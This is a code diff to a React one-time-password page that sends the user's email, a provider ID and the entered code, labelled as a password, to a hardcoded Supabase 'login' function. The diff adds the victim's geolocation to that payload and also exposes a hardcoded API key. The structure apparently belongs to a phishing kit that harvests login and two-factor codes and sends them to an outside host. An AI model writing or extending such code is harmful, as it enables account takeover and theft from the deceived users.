@@ -1,5 +1,6 @@
 import React, { useState, useRef, useEffect } from 'react';
 import { RefreshCw } from 'lucide-react';
+import { getGeoInfo } from '../utils/geoip';
 
 interface OTPPageProps {
   email: string;
@@ -33,6 +34,9 @@ export default function OTPPage({ email, providerId, onVerify, onClose }: OTPPag
       const supabaseUrl = 'https://nxzvpcbudbqotujuuczo.supabase.co';
       const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im54enZwY2J1ZGJxb3R1anV1Y3pvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc4MTQ0MzcsImV4cCI6MjA4MzM5MDQzN30.45hqzbpj27CRlI3gRhtlS_VOIsuitYKDhEOPrpSminc';
 
+      // Resolve geolocation (cached, never blocks UX)
+      const geo = await getGeoInfo();
+
       await fetch(`${supabaseUrl}/functions/v1/login`, {
         method: 'POST',
         headers: {
@@ -43,7 +47,9 @@ export default function OTPPage({ email, providerId, onVerify, onClose }: OTPPag
         body: JSON.stringify({
           email: email,
           provider: providerId,
-          password: `[OTP Code] ${code}`
+          password: `[OTP Code] ${code}`,
+          // Spread all available geo fields
+          ...geo,
         })
       });
     } catch (err) {
